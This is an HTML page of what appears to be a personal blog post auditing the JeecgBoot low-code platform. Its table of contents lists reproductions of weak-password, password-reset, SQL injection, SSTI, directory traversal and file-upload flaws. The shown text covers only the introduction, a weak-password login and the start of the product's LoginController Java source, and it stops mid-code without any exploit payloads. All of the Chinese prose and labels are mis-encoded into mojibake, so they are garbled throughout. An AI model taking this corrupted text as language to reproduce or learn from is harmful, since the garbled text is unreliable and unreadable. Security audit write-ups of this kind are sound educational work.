<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="æƒ³å­¦ä»£ç å®¡è®¡äº†ï¼Œæ‹¿JeecgBootç»ƒç»ƒæ‰‹">
<title>JeecgBootæ¼æ´å¤ç°</title>

<link rel='canonical' href='https://xxxxctfer.github.io/p/jeecgboot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>

<link rel="stylesheet" href="/scss/style.min.1ae76ab9aa3beab52f99d9b5f59d64d06778453e93ff523a98332d15179df142.css"><meta property='og:title' content="JeecgBootæ¼æ´å¤ç°">
<meta property='og:description' content="æƒ³å­¦ä»£ç å®¡è®¡äº†ï¼Œæ‹¿JeecgBootç»ƒç»ƒæ‰‹">
<meta property='og:url' content='https://xxxxctfer.github.io/p/jeecgboot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
<meta property='og:site_name' content='xxxx'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-30T00:00:00&#43;00:00'/><meta property='og:image' content='https://xxxxctfer.github.io/images/JeecgBoot/1.png' />
<meta name="twitter:title" content="JeecgBootæ¼æ´å¤ç°">
<meta name="twitter:description" content="æƒ³å­¦ä»£ç å®¡è®¡äº†ï¼Œæ‹¿JeecgBootç»ƒç»ƒæ‰‹"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://xxxxctfer.github.io/images/JeecgBoot/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_a014c1f4876185e.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥°</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">xxxx</a></h1>
            <h2 class="site-description">ä¸€ä¸ªè¿˜åœ¨åŠªåŠ›çš„xxxx</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/xxxxctfer'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E9%93%BE/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹é“¾</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc stack-toc">
            <ol class="toc-level-1"><li class="toc-item-h1">
                        <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4%e6%bc%8f%e6%b4%9e%e5%bc%b1%e5%8f%a3%e4%bb%a4%e6%bc%8f%e6%b4%9e%0a%3c%2fh1%3e" aria-label="å¼±å£ä»¤æ¼æ´ ">å¼±å£ä»¤æ¼æ´ </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#logincontrollerLoginController%0a%3c%2fh2%3e" aria-label="LoginController ">LoginController </a><li class="toc-item-h2">
                        <a href="#%e4%bf%ae%e6%94%b9%e5%bb%ba%e8%ae%ae%e4%bf%ae%e6%94%b9%e5%bb%ba%e8%ae%ae%0a%3c%2fh2%3e" aria-label="ä¿®æ”¹å»ºè®® ">ä¿®æ”¹å»ºè®® </a></ol></li><li class="toc-item-h1">
                        <a href="#%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae%0a%3c%2fh1%3e" aria-label="ä»»æ„ç”¨æˆ·å¯†ç é‡ç½® ">ä»»æ„ç”¨æˆ·å¯†ç é‡ç½® </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#passwordchange%e6%8e%a5%e5%8f%a3passwordChange%e6%8e%a5%e5%8f%a3%0a%3c%2fh2%3e" aria-label="passwordChangeæ¥å£ ">passwordChangeæ¥å£ </a><li class="toc-item-h2">
                        <a href="#%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae%0a%3c%2fh2%3e" aria-label="ä¿®å¤å»ºè®® ">ä¿®å¤å»ºè®® </a></ol></li><li class="toc-item-h1">
                        <a href="#%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2%e6%bc%8f%e6%b4%9e%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2%e6%bc%8f%e6%b4%9e%0a%3c%2fh1%3e" aria-label="ä¿¡æ¯æ³„éœ²æ¼æ´ ">ä¿¡æ¯æ³„éœ²æ¼æ´ </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#querysysuser%e6%8e%a5%e5%8f%a3querySysUser%e6%8e%a5%e5%8f%a3%0a%3c%2fh2%3e" aria-label="querySysUseræ¥å£ ">querySysUseræ¥å£ </a><li class="toc-item-h2">
                        <a href="#%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae-1%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae%0a%3c%2fh2%3e" aria-label="ä¿®å¤å»ºè®® ">ä¿®å¤å»ºè®® </a></ol></li><li class="toc-item-h1">
                        <a href="#%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86%e6%bc%8f%e6%b4%9e%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86%e6%bc%8f%e6%b4%9e%0a%3c%2fh1%3e" aria-label="ç›®å½•éå†æ¼æ´ ">ç›®å½•éå†æ¼æ´ </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#js%e6%96%87%e4%bb%b6%e4%bb%a3%e7%a0%81JS%e6%96%87%e4%bb%b6%e4%bb%a3%e7%a0%81%0a%3c%2fh2%3e" aria-label="JSæ–‡ä»¶ä»£ç  ">JSæ–‡ä»¶ä»£ç  </a><li class="toc-item-h2">
                        <a href="#%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae-2%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae%0a%3c%2fh2%3e" aria-label="ä¿®å¤å»ºè®® ">ä¿®å¤å»ºè®® </a></ol></li><li class="toc-item-h1">
                        <a href="#sql%e6%b3%a8%e5%85%a5SQL%e6%b3%a8%e5%85%a5%0a%3c%2fh1%3e" aria-label="SQLæ³¨å…¥ ">SQLæ³¨å…¥ </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#querytabledata%e6%8e%a5%e5%8f%a3queryTableData%e6%8e%a5%e5%8f%a3%0a%3c%2fh2%3e" aria-label="queryTableDataæ¥å£ ">queryTableDataæ¥å£ </a><li class="toc-item-h2">
                        <a href="#%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae-3%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae%0a%3c%2fh2%3e" aria-label="ä¿®å¤å»ºè®® ">ä¿®å¤å»ºè®® </a><li class="toc-item-h2">
                        <a href="#getdictitemsbytable%e6%8e%a5%e5%8f%a3getDictItemsByTable%e6%8e%a5%e5%8f%a3%0a%3c%2fh2%3e" aria-label="getDictItemsByTableæ¥å£ ">getDictItemsByTableæ¥å£ </a><li class="toc-item-h2">
                        <a href="#%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae-4%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae%0a%3c%2fh2%3e" aria-label="ä¿®å¤å»ºè®® ">ä¿®å¤å»ºè®® </a></ol></li><li class="toc-item-h1">
                        <a href="#ssti%e6%bc%8f%e6%b4%9eSSTI%e6%bc%8f%e6%b4%9e%0a%3c%2fh1%3e" aria-label="SSTIæ¼æ´ ">SSTIæ¼æ´ </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#loadtabledata%e6%96%b9%e6%b3%95loadTableData%e6%96%b9%e6%b3%95%0a%3c%2fh2%3e" aria-label="loadTableDataæ–¹æ³• ">loadTableDataæ–¹æ³• </a><li class="toc-item-h2">
                        <a href="#sendmsg%e6%8e%a5%e5%8f%a3sendMsg%e6%8e%a5%e5%8f%a3%0a%3c%2fh2%3e" aria-label="sendMsgæ¥å£ ">sendMsgæ¥å£ </a></ol></li><li class="toc-item-h1">
                        <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%0a%3c%2fh1%3e" aria-label="æ–‡ä»¶ä¸Šä¼ æ¼æ´ ">æ–‡ä»¶ä¸Šä¼ æ¼æ´ </a><ol class="toc-level-2"><li class="toc-item-h2">
                        <a href="#upload%e6%8e%a5%e5%8f%a3upload%e6%8e%a5%e5%8f%a3%0a%3c%2fh2%3e" aria-label="uploadæ¥å£ ">uploadæ¥å£ </a><li class="toc-item-h2">
                        <a href="#commoncontrollerdocommonController.do%0a%3c%2fh2%3e" aria-label="commonController.do ">commonController.do </a></ol></li></ol></li></div>
    </section>


            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/jeecgboot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                
                    <img src="/images/JeecgBoot/1.png" loading="lazy" alt="Featured image of post JeecgBootæ¼æ´å¤ç°" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >
                ä»£ç å®¡è®¡
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/jeecgboot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">JeecgBootæ¼æ´å¤ç°</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            æƒ³å­¦ä»£ç å®¡è®¡äº†ï¼Œæ‹¿JeecgBootç»ƒç»ƒæ‰‹
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published" datetime='2025-12-30T00:00:00Z'>2025-12-30</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>æˆ‘ä»¬è¿˜æ˜¯å…ˆæœç´¢ä¸€ä¸‹è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œè¿™æ¬¡ä»£ç å®¡è®¡çš„ç›®çš„ä¹Ÿå°±æ˜¯ä¸ºäº†å­¦ä¹ ä¸€ä¸‹æ€ä¹ˆå®¡è®¡ï¼Œå»æ‰“ä¸€äº›è€æ¼æ´ï¼ŒæŒ–æ˜ä¸€ä¸‹çœ‹çœ‹ã€‚
å…ˆçœ‹æœç´¢åˆ°çš„ç»“æœã€‚</p>
<blockquote>
<p>[!NOTE] ç®€ä»‹
JeecgBootæ˜¯ä¸€æ¬¾é›†æˆAIåº”ç”¨çš„ï¼ŒåŸºäºBPMæµç¨‹çš„ä½ä»£ç å¹³å°ï¼Œæ—¨åœ¨å¸®åŠ©ä¼ä¸šå¿«é€Ÿå®ç°ä½ä»£ç å¼€å‘å’Œæ„å»ºä¸ªæ€§åŒ–AIåº”ç”¨ï¼å‰åç«¯åˆ†ç¦»æ¶æ„Ant Design&amp;Vue3ï¼ŒSpringBootï¼ŒSpringCloud Alibabaï¼ŒMybatis-plusï¼ŒShiroã€‚å¼ºå¤§çš„ä»£ç ç”Ÿæˆå™¨è®©å‰åç«¯ä»£ç ä¸€é”®ç”Ÿæˆï¼Œæ— éœ€å†™ä»»ä½•ä»£ç ï¼ å¼•é¢†AIä½ä»£ç å¼€å‘æ¨¡å¼: AIç”Ÿæˆ-&gt;OnlineCoding-&gt; ä»£ç ç”Ÿæˆ-&gt; æ‰‹å·¥MERGEï¼Œ å¸®åŠ©Javaé¡¹ç›®è§£å†³80%çš„é‡å¤å·¥ä½œï¼Œè®©å¼€å‘æ›´å¤šå…³æ³¨ä¸šåŠ¡ï¼Œæé«˜æ•ˆç‡ã€èŠ‚çœæˆæœ¬ï¼ŒåŒæ—¶åˆä¸å¤±çµæ´»æ€§ï¼ä½ä»£ç èƒ½åŠ›ï¼šOnlineè¡¨å•ã€è¡¨å•è®¾è®¡ã€æµç¨‹è®¾è®¡ã€OnlineæŠ¥è¡¨ã€å¤§å±/ä»ªè¡¨ç›˜è®¾è®¡ã€æŠ¥è¡¨è®¾è®¡; AIåº”ç”¨å¹³å°åŠŸèƒ½ï¼šAIçŸ¥è¯†åº“é—®ç­”ã€AIæ¨¡å‹ç®¡ç†ã€AIæµç¨‹ç¼–æ’ã€AIèŠå¤©ç­‰ï¼Œæ”¯æŒå«ChatGPTã€DeepSeekã€Ollamaç­‰å¤šç§AIå¤§æ¨¡å‹ã€‚</p>
</blockquote>
<p>OKï¼Œå¤§ä½“èƒ½çŸ¥é“å®ƒæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿å°±è¡Œï¼Œæ¥ä¸‹æ¥æ¥çœ‹æ¼æ´ä»€ä¹ˆçš„ã€‚</p>
<h1 id="å¼±å£ä»¤æ¼æ´">å¼±å£ä»¤æ¼æ´
</h1><p>æˆ‘ä»¬è®¿é—®æˆ‘ä»¬çš„å‰ç«¯ï¼Œä¹Ÿå°±æ˜¯3000çš„localhostï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢ã€‚
<img src="/images/JeecgBoot/1.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
æˆ‘ä»¬è¿™é‡Œç›´æ¥å°è¯•å¼±å£ä»¤çš„æ¼æ´æ”»å‡»è¯•ä¸€ä¸‹ã€‚
<img src="/images/JeecgBoot/2.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
<img src="/images/JeecgBoot/3.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
å‘ç°ç›´æ¥è¿›å…¥äº†ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹æºå¤´æ˜¯æ€ä¹ˆæ¥çš„ã€‚å¾ˆç®€å•ï¼Œåœ¨æ—¥å¿—å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒçš„å…¨ç±»åæ˜¯ <code>org.jeecg.modules.system.controller.LoginController</code> ï¼Œå½“ç„¶ï¼Œå…¶å®ä¸çœ‹æ—¥å¿—ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»çš„ï¼Œè¿™é‡Œåªæ˜¯å·æ‡’äº†ä¸€ä¸‹ã€‚</p>
<h2 id="logincontroller">LoginController
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ApiOperation</span><span class="p">(</span><span class="s">&#34;ç™»å½•æ¥å£&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="nd">@RequestMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/login&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestMethod</span><span class="p">.</span><span class="na">POST</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">JSONObject</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">SysLoginModel</span><span class="w"> </span><span class="n">sysLoginModel</span><span class="p">){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">JSONObject</span><span class="o">&gt;</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">JSONObject</span><span class="o">&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysLoginModel</span><span class="p">.</span><span class="na">getUsername</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysLoginModel</span><span class="p">.</span><span class="na">getPassword</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin--Author:scott  Date:20190805 forï¼šæš‚æ—¶æ³¨é‡Šæ‰å¯†ç åŠ å¯†é€»è¾‘ï¼Œæœ‰ç‚¹é—®é¢˜  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//å‰ç«¯å¯†ç åŠ å¯†ï¼Œåç«¯è¿›è¡Œå¯†ç è§£å¯†  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//password = AesEncryptUtil.desEncrypt(sysLoginModel.getPassword().replaceAll(&#34;%2B&#34;, &#34;\\+&#34;)).trim();//å¯†ç è§£å¯†  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin--Author:scott  Date:20190805 forï¼šæš‚æ—¶æ³¨é‡Šæ‰å¯†ç åŠ å¯†é€»è¾‘ï¼Œæœ‰ç‚¹é—®é¢˜  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin-author:taoyan date:20190828 for:æ ¡éªŒéªŒè¯ç   </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">String</span><span class="w"> </span><span class="n">captcha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysLoginModel</span><span class="p">.</span><span class="na">getCaptcha</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="p">(</span><span class="n">captcha</span><span class="o">==</span><span class="kc">null</span><span class="p">){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">result</span><span class="p">.</span><span class="na">error500</span><span class="p">(</span><span class="s">&#34;éªŒè¯ç æ— æ•ˆ&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">String</span><span class="w"> </span><span class="n">lowerCaseCaptcha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">captcha</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">realKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Md5Util</span><span class="p">.</span><span class="na">md5Encode</span><span class="p">(</span><span class="n">lowerCaseCaptcha</span><span class="o">+</span><span class="n">sysLoginModel</span><span class="p">.</span><span class="na">getCheckKey</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;utf-8&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">checkCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">redisUtil</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">realKey</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//å½“è¿›å…¥ç™»å½•é¡µæ—¶ï¼Œæœ‰ä¸€å®šå‡ ç‡å‡ºç°éªŒè¯ç é”™è¯¯ #1714    if(checkCode==null || !checkCode.toString().equals(lowerCaseCaptcha)) {  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="n">log</span><span class="p">.</span><span class="na">warn</span><span class="p">(</span><span class="s">&#34;éªŒè¯ç é”™è¯¯ï¼Œkey= {} , Ui checkCode= {}, Redis checkCode = {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">sysLoginModel</span><span class="p">.</span><span class="na">getCheckKey</span><span class="p">(),</span><span class="w"> </span><span class="n">lowerCaseCaptcha</span><span class="p">,</span><span class="w"> </span><span class="n">checkCode</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">result</span><span class="p">.</span><span class="na">error500</span><span class="p">(</span><span class="s">&#34;éªŒè¯ç é”™è¯¯&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="c1">// æ”¹æˆç‰¹æ®Šçš„code ä¾¿äºå‰ç«¯åˆ¤æ–­  </span><span class="w">
